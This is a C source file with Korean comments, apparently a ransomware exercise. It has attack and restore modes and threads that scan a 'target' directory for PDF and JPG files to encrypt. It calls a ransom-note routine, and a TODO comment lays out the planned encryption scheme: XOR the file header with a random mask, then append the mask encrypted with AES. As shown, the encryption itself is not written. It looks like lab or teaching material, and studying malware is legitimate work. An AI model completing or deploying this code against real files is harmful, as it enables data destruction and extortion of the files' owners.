#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/stat.h>
#include <limits.h>

#include "crypto.h"
#include "utils.h"

#define THREAD_COUNT 2   // 0번: PDF, 1번: JPG 같은 식으로 쓸 예정
#define TARGET_DIR   "target"    // 공격/복구 대상 디렉터리

typedef void *(*thread_func_t)(void *);

struct thread_arg {
    const char *password;
    int thread_id;
};

// 파일 이름에서 소문자 확장자를 리턴 (예: "test.PDF" -> "pdf")
// 확장자가 없으면 NULL
const char *get_extension(const char *filename)
{
    const char *dot = strrchr(filename, '.');
    if (!dot || dot == filename) return NULL;
    dot++; // '.' 다음 문자부터

    // 간단히 소문자로 바꾼 복사본을 만들자
    static char ext[16];
    size_t len = strlen(dot);
    if (len >= sizeof(ext)) len = sizeof(ext) - 1;

    for (size_t i = 0; i < len; ++i) {
        char c = dot[i];
        if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
        ext[i] = c;
    }
    ext[len] = '\0';
    return ext;
}

// 이 스레드가 이 파일을 처리해야 하는지 여부
int should_process_file(int thread_id, const char *filename)
{
    const char *ext = get_extension(filename);
    if (!ext) return 0;

    // 0번 스레드: PDF
    if (thread_id == 0) {
        if (strcmp(ext, "pdf") == 0)
            return 1;
    }

    // 1번 스레드: JPG/JPEG
    if (thread_id == 1) {
        if (strcmp(ext, "jpg") == 0 || strcmp(ext, "jpeg") == 0)
            return 1;
    }

    return 0;
}

// 스레드 함수 프로토타입
void *attack(void *param);
void *restore(void *param);

int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <attack|restore> <password>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *mode = argv[1];
    const char *password = argv[2];

    thread_func_t worker = NULL;

    if (strcmp(mode, "attack") == 0) {
        worker = attack;
    } else if (strcmp(mode, "restore") == 0) {
        worker = restore;
    } else {
        fprintf(stderr, "Invalid mode: %s (use attack or restore)\n", mode);
        return EXIT_FAILURE;
    }

    pthread_t tids[THREAD_COUNT];
    struct thread_arg args[THREAD_COUNT];

    for (int i = 0; i < THREAD_COUNT; ++i) {
        args[i].password = password;
        args[i].thread_id = i;

        if (pthread_create(&tids[i], NULL, worker, &args[i]) != 0) {
            perror("pthread_create");
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < THREAD_COUNT; ++i) {
        pthread_join(tids[i], NULL);
    }

    if (worker == attack) {
        print_attack_note();
    } else {
        print_restore_note();
    }

    return EXIT_SUCCESS;
}


void *attack(void *param)
{
    struct thread_arg *arg = (struct thread_arg *)param;

    printf("[attack] thread %d started with password '%s'\n",
           arg->thread_id, arg->password);

    DIR *dir = opendir(TARGET_DIR);
    if (!dir) {
        perror("opendir (attack)");
        return NULL;
    }

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL) {
        // . 와 .. 는 스킵
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        // 디렉터리는 스킵 (우리는 파일만 대상)
        char path[PATH_MAX];
        snprintf(path, sizeof(path), "%s/%s", TARGET_DIR, ent->d_name);

        struct stat st;
        if (stat(path, &st) != 0 || !S_ISREG(st.st_mode))
            continue;

        // 이 스레드가 담당하는 확장자가 아니면 패스
        if (!should_process_file(arg->thread_id, ent->d_name))
            continue;

        printf("[attack] thread %d will encrypt file: %s\n",
               arg->thread_id, path);

        // TODO: 여기서부터 실제 암호화 로직을 넣을 예정
        //  1) 파일 첫 16바이트 읽기
        //  2) 랜덤 mask 만들기
        //  3) plaintext XOR mask 로 덮어쓰기
        //  4) mask를 AES로 암호화해서 파일 끝에 append
    }

    closedir(dir);
    return NULL;
}
